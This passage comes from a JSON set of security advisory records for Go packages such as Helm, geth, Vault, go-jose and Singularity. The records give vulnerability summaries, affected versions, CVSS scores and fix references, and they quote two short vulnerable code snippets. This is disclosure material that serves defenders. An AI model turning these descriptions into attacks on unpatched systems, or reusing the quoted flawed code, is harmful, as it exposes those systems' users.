[{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.0.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.12"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32575"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-14-nomad-bridge-networking-mode-allows-arp-spoofing-from-other-bridged-tasks-on-same-node/24296"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/nomad"}], "database_specific": {"cwe_ids": ["CWE-1100"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-06-18T18:39:21Z", "nvd_published_at": "2021-06-17T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-56hp-xqp3-w2jf", "modified": "2023-08-30T18:45:08Z", "published": "2021-06-23T18:14:15Z", "aliases": [], "summary": "Helm passes repository credentials to alternate domain", "details": "While working on the Helm source, a Helm core maintainer discovered a situation where the username and password credentials associated with a Helm repository could be passed on to another domain referenced by that Helm repository.\n\n### Impact\n\nThe `index.yaml` within a Helm chart repository contains a reference where to get the chart archive for each version of a chart. The reference can be relative to the `index.yaml` file or a URL to location. The URL can point to any domain and this is a feature leveraged by Helm users. For example, an `index.yaml` file can be hosted on GitHub pages while the chart archives are hosted as GitHub releases. These are on different domain names and the `index.yaml` file points to the other domain.\n\nWhen a username and password were associated with a Helm repository the username and password were also passed on to other domains referenced in the `index.yaml` file. This occurred when Helm went to retrieve a specific chart archive on the other domain.\n\n### Patches\n\nThis issue has been resolved in 3.6.1.\n\nThere is a slight behavior change to credential handling with regard to repositories. Usernames and passwords are only passed to the URL location of the Helm repository by default. The username and password are scoped to the scheme, host, and port of the Helm repository. To pass the username and password to other domains Helm may encounter when it goes to retrieve a chart, the new `--pass-credentials` flag can be used. This flag restores the old behavior for a single repository as an opt-in behavior.\n\n### Workarounds\n\nIf you use a username and password for a Helm repository you can audit the Helm repository in order to check for another domain being used that could have received the credentials. In the `index.yaml` file for that repository, look for another domain in the `urls` list for the chart versions. If there is another domain found and that chart version was pulled or installed the credentials would have been passed on.\n\n### For more information\n\nHelm's security policy is spelled out in detail in our [SECURITY](https://github.com/helm/community/blob/master/SECURITY.md) document.\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.6.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-56hp-xqp3-w2jf"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32690"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/61d8e8c4a6f95540c15c6a65f36a6dd0a45e7a2f"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-56hp-xqp3-w2jf"}, {"type": "PACKAGE", "url": "https://github.com/helm/helm"}, {"type": "WEB", "url": "https://github.com/helm/helm/releases/tag/v3.6.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0384"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-06-16T19:43:50Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-7gfg-6934-mqq2", "modified": "2023-02-14T00:18:06Z", "published": "2021-06-29T21:34:57Z", "aliases": ["CVE-2019-20786"], "summary": "Improper Authenication in Pion DTLS", "details": "handleIncomingPacket in conn.go in Pion DTLS before 1.5.2 lacks a check for application data with epoch 0, which allows remote attackers to inject arbitrary unencrypted data after handshake completion.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pion/dtls"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-20786"}, {"type": "WEB", "url": "https://github.com/pion/dtls/pull/128"}, {"type": "WEB", "url": "https://github.com/pion/dtls/commit/fd73a5df2ff0e1fb6ae6a51e2777d7a16cc4f4e0"}, {"type": "PACKAGE", "url": "https://github.com/pion/dtls"}, {"type": "WEB", "url": "https://github.com/pion/dtls/compare/v1.5.1...v1.5.2"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0038"}, {"type": "WEB", "url": "https://www.usenix.org/conference/usenixsecurity20/presentation/fiterau-brostean"}, {"type": "WEB", "url": "https://www.usenix.org/system/files/sec20fall_fiterau-brostean_prepub.pdf"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-25T19:54:18Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-p55x-7x9v-q8m4", "modified": "2021-05-20T20:59:20Z", "published": "2021-06-29T21:45:07Z", "aliases": ["CVE-2017-15133"], "summary": "Denial of Service in miekg-dns", "details": "A denial of service flaw was found in miekg-dns before 1.0.4. A remote attacker could use carefully timed TCP packets to block the DNS server from accepting new connections.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/miekg/dns"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-15133"}, {"type": "WEB", "url": "https://github.com/miekg/dns/issues/627"}, {"type": "WEB", "url": "https://github.com/miekg/dns/pull/631"}, {"type": "WEB", "url": "https://github.com/miekg/dns/commit/43913f2f4fbd7dcff930b8a809e709591e4dd79e"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1538763"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0006"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T20:59:20Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-r4gv-vj59-cccm", "modified": "2021-05-21T18:06:39Z", "published": "2021-06-23T17:27:27Z", "aliases": ["CVE-2020-26283"], "summary": "Control character injection in console output in github.com/ipfs/go-ipfs ", "details": "### Impact\nControl characters are not escaped from console output. This can result in hiding input from the user which could result in the user taking an unknown, malicious action.\n\n### Patches\n<!-- _Has the problem been patched? What versions should users upgrade to?_  -->\n\n- Patched via https://github.com/ipfs/go-ipfs/pull/7831 in v0.8.0\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-ipfs](http://github.com/ipfs/go-ipfs)\n* Email us at [security@ipfs.io](mailto:security@ipfs.io)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipfs/go-ipfs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.8.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipfs/go-ipfs/security/advisories/GHSA-r4gv-vj59-cccm"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26283"}, {"type": "WEB", "url": "https://github.com/ipfs/go-ipfs/pull/7831"}, {"type": "WEB", "url": "https://github.com/ipfs/go-ipfs/commit/fb0a9acd2d8288bd1028c3219a420de62a09683a"}], "database_specific": {"cwe_ids": ["CWE-116", "CWE-150"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T18:06:39Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-qq3j-xp49-j73f", "modified": "2023-10-02T12:19:49Z", "published": "2021-06-23T18:14:36Z", "aliases": ["CVE-2020-4053"], "summary": "Plugin archive directory traversal in Helm", "details": "The Helm core maintainers have identified an information disclosure\nvulnerability in Helm 3.0.0-3.2.3. \n\n### Impact\n\nA traversal attack is possible when installing Helm plugins from a tar\narchive over HTTP.  It is possible for a malicious plugin author to inject a relative\npath into a plugin archive, and copy a file outside of the intended directory.\n\nTraversal Attacks are a form of a Directory Traversal that can be exploited by\nextracting files from an archive. The premise of the Directory Traversal\nvulnerability is that an attacker can gain access to parts of the file system\noutside of the target folder in which they should reside. The attacker can\nthen overwrite executable files and either invoke them remotely or wait for\nthe system or user to call them, thus achieving Remote Command Execution on\nthe victim's machine. The vulnerability can also cause damage by overwriting\nconfiguration files or other sensitive resources, and can be exploited on both\nclient (user) machines and servers.\n\nhttps://snyk.io/research/zip-slip-vulnerability\n\n### Specific Go Packages Affected\nhelm.sh/helm/v3/pkg/plugin/installer\n\n### Patches\n\nThis issue has been fixed in Helm 3.2.4 \n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the Helm repository](https://github.com/helm/helm/issues)\n* For security-specific issues, email us at [cncf-helm-security@lists.cncf.io](mailto:cncf-helm-security@lists.cncf.io)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.2.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-qq3j-xp49-j73f"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-4053"}, {"type": "WEB", "url": "https://github.com/helm/helm/pull/8317"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/0ad800ef43d3b826f31a5ad8dfbb4fe05d143688"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/b6bbe4f08bbb98eadd6c9cd726b08a5c639908b3"}, {"type": "WEB", "url": "https://github.com/helm/helm/releases/tag/v3.2.4"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-24T20:57:17Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-f6mq-5m25-4r72", "modified": "2023-08-30T00:18:26Z", "published": "2021-06-15T16:08:16Z", "aliases": ["CVE-2021-20329"], "summary": "go.mongodb.org/mongo-driver improperly validates cstrings when marshalling Go objects into BSON", "details": "Specific cstrings input may not be properly validated in the MongoDB Go Driver when marshalling Go objects into BSON. A malicious user could use a Go object with specific string to potentially inject additional fields into marshalled documents. This issue affects all MongoDB GO Drivers up to (and including) 1.5.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.mongodb.org/mongo-driver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-20329"}, {"type": "WEB", "url": "https://github.com/mongodb/mongo-go-driver/pull/622"}, {"type": "WEB", "url": "https://github.com/mongodb/mongo-go-driver/commit/2aca31d5986a9e1c65a92264736de9fdc3b9b4ca"}, {"type": "WEB", "url": "https://github.com/mongodb/mongo-go-driver/releases/tag/v1.5.1"}, {"type": "WEB", "url": "https://jira.mongodb.org/browse/GODRIVER-1923"}], "database_specific": {"cwe_ids": ["CWE-1287", "CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-06-14T19:11:50Z", "nvd_published_at": "2021-06-10T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qj26-7grj-whg3", "modified": "2023-02-09T19:59:34Z", "published": "2021-06-23T17:18:49Z", "aliases": ["CVE-2018-6558"], "summary": "Privilege Escalation in fscrypt", "details": "The pam_fscrypt module in fscrypt before 0.2.4 may incorrectly restore primary and supplementary group IDs to the values associated with the root user, which allows attackers to gain privileges via a successful login through certain applications that use Linux-PAM (aka pam).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/google/fscrypt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-6558"}, {"type": "WEB", "url": "https://github.com/google/fscrypt/issues/77"}, {"type": "WEB", "url": "https://github.com/google/fscrypt/commit/3022c1603d968c22f147b4a2c49c4637dd1be91b"}, {"type": "WEB", "url": "https://github.com/google/fscrypt/commit/315f9b042237200174a1fb99427f74027e191d66"}, {"type": "PACKAGE", "url": "https://github.com/google/fscrypt"}, {"type": "WEB", "url": "https://launchpad.net/bugs/1787548"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0027"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T21:04:58Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-c38g-469g-cmgx", "modified": "2023-02-17T23:46:35Z", "published": "2021-06-23T18:14:40Z", "aliases": ["CVE-2021-21303"], "summary": "Improper Neutralization of Special Elements in Output in helm.sh/helm/v3", "details": "\nSince Helm 2 was released, a well-documented aspect of Helm is that the Helm chart's version number MUST follow the SemVer2 specification. In the past, Helm would not permit charts with malformed versions. At some point, a patch was merged that changed this - On a version parse error, the version number was simply passed along as-is. This provided a vector for malicious data to be injected into Helm and potentially used in various ways.\n\nCore maintainers were able to send deceptive information to a terminal screen running the `helm` command, as well as obscure or alter information on the screen. In some cases, we could send codes that terminals used to execute higher-order logic, like clearing a terminal screen.\n\nFurther, during evaluation, the Helm maintainers discovered a few other fields that were not properly sanitized when read out of repository index files. This fix remedies all such cases, and once again enforces SemVer2 policies on version fields.\n\nAll users of the Helm 3 should upgrade.\n\nThose who use Helm as a library should verify that they either sanitize this data on their own, or use the proper Helm API calls to sanitize the data.\n\n### Patches\nThis issue has been resolved in Helm 3.5.2.\n\nWhile this fix does not constitute a breaking change, as all field formatting is now enforced as documented, it is possible that charts that were mistakenly allowed (but invalid) may no longer be available in search indexes. Specifically, **malformed SemVer versions are no longer supported**. This has always been the documented case, but it is true that malformed versions were allowed.\n\nNote that this is the first security release since Helm 2's final deprecation. Helm 2 was not audited for vulnerability to this issue, and should be assumed vulnerable.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.5.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-c38g-469g-cmgx"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-21303"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/6ce9ba60b73013857e2e7c73d3f86ed70bc1ac9a"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-c38g-469g-cmgx"}, {"type": "PACKAGE", "url": "https://github.com/helm/helm"}, {"type": "WEB", "url": "https://github.com/helm/helm/releases/tag/v3.5.2"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1040"}], "database_specific": {"cwe_ids": ["CWE-74"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T14:30:59Z", "nvd_published_at": "2021-02-05T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9h4h-8w5p-f28w", "modified": "2023-10-02T11:53:10Z", "published": "2021-06-29T21:23:15Z", "aliases": ["CVE-2018-19184"], "summary": "Go Ethereum Denial of Service", "details": "`cmd/evm/runner.go` in Go Ethereum (aka geth) allows attackers to cause a denial of service (SEGV) via crafted bytecode.\n### Specific Go Packages Affected\ngithub.com/ethereum/go-ethereum/cmd/evm", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.8.14"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-19184"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/issues/18069"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/commit/83e2761c3a13524bd5d6597ac08994488cf872ef"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/commit/fb9f7261ec51e38eedb454594fc19f00de1a6834"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T18:58:40Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-r33q-22hv-j29q", "modified": "2023-02-09T19:39:22Z", "published": "2021-06-29T21:14:07Z", "aliases": ["CVE-2020-26264"], "summary": "Denial of service in github.com/ethereum/go-ethereum", "details": "### Impact\n\nA DoS vulnerability can make a LES server crash via malicious `GetProofsV2` request from a connected LES client.\n\n### Patches\n\nThe vulnerability was patched in https://github.com/ethereum/go-ethereum/pull/21896. \n\n### Workarounds\n\nThis vulnerability only concerns users explicitly enabling `les` server; disabling `les` prevents the exploit. \nIt can also be patched by manually applying the patch in https://github.com/ethereum/go-ethereum/pull/21896. \n\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum)\n* Email us at [security@ethereum.org](mailto:security@ethereum.org)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.25"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/security/advisories/GHSA-r33q-22hv-j29q"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26264"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/pull/21896"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/commit/bddd103a9f0af27ef533f04e06ea429cf76b6d46"}, {"type": "PACKAGE", "url": "https://github.com/ethereum/go-ethereum"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/releases/tag/v1.9.25"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0063"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T21:45:23Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5gjg-jgh4-gppm", "modified": "2021-10-05T16:37:09Z", "published": "2021-06-23T17:26:30Z", "aliases": [], "summary": "Websocket requests did not call AuthenticateMethod", "details": "### Impact\n\nDepending on implementation, a denial-of-service or privilege escalation vulnerability may occur in software that uses the `github.com/ecnepsnai/web` package with Web Sockets that have an AuthenticateMethod.\n\nThe `AuthenticateMethod` is not called, and `UserData` will be nil in request methods. Attempts to read the `UserData` may result in a panic.\n\nThis issue only affects web sockets where an `AuthenticateMethod` is supplied to the handle options. Users who do not use web sockets, or users who do not require authentication are not at risk.\n\n#### Example\n\nIn the example below, one would expect that the `AuthenticateMethod` function would be called for each request to `/example`\n\n```go\nhandleOptions := web.HandleOptions{\n\tAuthenticateMethod: func(request *http.Request) interface{} {\n\t\t// Assume there is logic here to check for an active sessions, look at cookies or headers, etc...\n\t\tvar session Session{} // Example\n\n\t\treturn session\n\t},\n}\n\nserver.Socket(\"/example\", handle, handleOptions)\n```\n\nHowever, the method is not called, and therefor the `UserData` parameter of the request object in the handle will be nil, when it would have been expected to be the `session` object we returned.\n\n### Patches\n\nRelease v1.5.2 fixes this vulnerability. The authenticate method is now called for websocket requests.\n\nAll users of the web package should update to v1.5.2 or later.\n\n### Workarounds\n\nYou may work around this issue by making the authenticate method a named function, then calling that function at the start of the handle method for the websocket. Reject connections when the return value of the method is nil.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ecnepsnai/web"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.0"}, {"fixed": "1.5.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ecnepsnai/web/security/advisories/GHSA-5gjg-jgh4-gppm"}, {"type": "WEB", "url": "https://github.com/ecnepsnai/web/commit/5a78f8d5c41ce60dcf9f61aaf47a7a8dc3e0002f"}, {"type": "PACKAGE", "url": "https://github.com/ecnepsnai/web"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0107"}], "database_specific": {"cwe_ids": ["CWE-304"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T17:41:20Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-86r9-39j9-99wp", "modified": "2021-05-20T16:54:50Z", "published": "2021-06-23T17:17:52Z", "aliases": ["CVE-2016-9121"], "summary": "Elliptic Curve Key Disclosure in go-jose", "details": "go-jose before 1.0.4 suffers from an invalid curve attack for the ECDH-ES algorithm. When deriving a shared key using ECDH-ES for an encrypted message, go-jose neglected to check that the received public key on a message is on the same curve as the static private key of the receiver, thus making it vulnerable to an invalid curve attack.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "gopkg.in/square/go-jose.v1"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/square/go-jose"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9121"}, {"type": "WEB", "url": "https://github.com/square/go-jose/commit/c7581939a3656bb65e89d64da0a52364a33d2507"}, {"type": "WEB", "url": "https://hackerone.com/reports/164590"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0010"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2016/11/03/1"}], "database_specific": {"cwe_ids": ["CWE-326"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-20T16:54:50Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-jq42-hfch-42f3", "modified": "2021-10-05T17:22:08Z", "published": "2021-06-01T21:20:53Z", "aliases": [], "summary": "Action Commands (run/shell/exec) Against Library URIs Ignore Configured Remote Endpoint", "details": "# Impact\nDue to incorrect use of a default URL, `singularity` action commands (`run`/`shell`/`exec`) specifying a container using a `library://` URI will always attempt to retrieve the container from the default remote endpoint (`cloud.sylabs.io`) rather than the configured remote endpoint.\n\nAn attacker may be able to push a malicious container to the default remote endpoint with a URI that is identical to the URI used by a victim with a non-default remote endpoint, thus executing the malicious container.\n\nOnly action commands (`run`/`shell`/`exec`) against `library://` URIs are affected. Other commands such as `pull` / `push` respect the configured remote endpoint.\n\n# Patches\nAll users should upgrade to Singularity 3.7.4 or later.\n\n# Workarounds\nUsers who only interact with the default remote endpoint or do not use the library:// url are not affected.\n\nInstallations with an execution control list configured to restrict execution to containers signed with specific secure keys are not affected.\n\n# Acknowledgements\nThis issue was found by Mike Frisch and brought to our attention by Sylabs.  Sylabs is making a [coordinated disclosure](https://github.com/sylabs/singularity/security/advisories/GHSA-5mv9-q7fq-9394).\n\n# For more information\nGeneral questions about the impact of the advisory can be asked in the:\n\n[Singularity Slack Channel](https://join.slack.com/t/hpcng/shared_invite/zt-qda4h1ls-OP0Uouq6sSmVE6i_0NrWdw)\n[Singularity Mailing List](https://groups.google.com/a/lbl.gov/g/singularity)\nAny sensitive security concerns should be directed to: [singularity-security@hpcng.org](mailto:singularity-security@hpcng.org)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hpcng/singularity"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.7.2"}, {"fixed": "3.7.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/hpcng/singularity/security/advisories/GHSA-jq42-hfch-42f3"}, {"type": "WEB", "url": "https://github.com/sylabs/singularity/security/advisories/GHSA-5mv9-q7fq-9394"}, {"type": "PACKAGE", "url": "https://github.com/hpcng/singularity"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-28T20:04:38Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-qv95-g3gm-x542", "modified": "2022-08-10T23:49:29Z", "published": "2021-10-12T16:39:01Z", "aliases": ["CVE-2021-41802"], "summary": "Hashicorp Vault Privilege Escalation Vulnerability", "details": "HashiCorp Vault and Vault Enterprise through 1.7.4 and 1.8.3 allowed a user with write permission to an entity alias ID sharing a mount accessor with another user to acquire this other user\u2019s policies by merging their identities. Fixed in Vault and Vault Enterprise 1.7.5 and 1.8.4.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:H/UI:R/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.8.0"}, {"fixed": "1.8.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-41802"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-27-vault-merging-multiple-entity-aliases-for-the-same-mount-may-allow-privilege-escalation/"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202207-01"}], "database_specific": {"cwe_ids": ["CWE-269", "CWE-732"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-10-11T18:57:45Z", "nvd_published_at": "2021-10-08T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m6m5-pp4g-fcc8", "modified": "2021-10-06T16:48:49Z", "published": "2021-10-06T17:47:35Z", "aliases": [], "summary": "S3 storage write is not aborted on errors leading to unbounded memory usage", "details": "### Impact\n\nAnyone using storage.blob.s3 introduced in 0.5.0 with storage.imapsql.\n```\nstorage.imapsql local_mailboxes {\n  ...\n  msg_store s3 {\n    ...\n  }\n}\n```\n\n### Patches\n\nThe relevant commit is pushed to master and will be included in the 0.5.1 release.\n\nNo special handling of the issue has been done due to the small amount of affected users.\n\n### Workarounds\n\nNone.\n\n### References\n\n* Original report: https://github.com/foxcpp/maddy/issues/395\n* Fix: https://github.com/foxcpp/maddy/commit/07c8495ee4394fabbf5aac4df8aebeafb2fb29d8", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/foxcpp/maddy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/foxcpp/maddy/security/advisories/GHSA-m6m5-pp4g-fcc8"}, {"type": "PACKAGE", "url": "https://github.com/foxcpp/maddy"}], "database_specific": {"cwe_ids": ["CWE-772"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-10-06T16:48:49Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-59hh-656j-3p7v", "modified": "2023-08-29T18:55:39Z", "published": "2021-10-25T19:42:57Z", "aliases": ["CVE-2021-41173"], "summary": "Geth Node Vulnerable to DoS via maliciously crafted p2p message ", "details": "### Impact\n\nA vulnerable node is susceptible to crash when processing a maliciously crafted message from a peer, via the `snap/1` protocol. The crash can be triggered by sending a malicious `snap/1` `GetTrieNodes` package. \n\n### Details\n\nOn September 21, 2021, geth-team member Gary Rong (@rjl493456442) found a way to crash the snap request handler . \nBy using this vulnerability, a peer connected on the `snap/1` protocol could cause a vulnerable node to crash with a `panic`.\n\nIn the `trie.TryGetNode` implementation, if the requested path is reached, the associated node will be returned. However the nilness is\nnot checked there.\n\n```golang\nfunc (t *Trie) tryGetNode(origNode node, path []byte, pos int) (item []byte, newnode node, resolved int, err error) {\n\t// If we reached the requested path, return the current node\n\tif pos >= len(path) {\n\t\t// Although we most probably have the original node expanded, encoding\n\t\t// that into consensus form can be nasty (needs to cascade down) and\n\t\t// time consuming. Instead, just pull the hash up from disk directly.\n\t\tvar hash hashNode\n\t\tif node, ok := origNode.(hashNode); ok {\n\t\t\thash = node\n\t\t} else {\n\t\t\thash, _ = origNode.cache()\n\t\t}\n```\nMore specifically the `origNode` can be nil(e.g. the child of fullnode) and 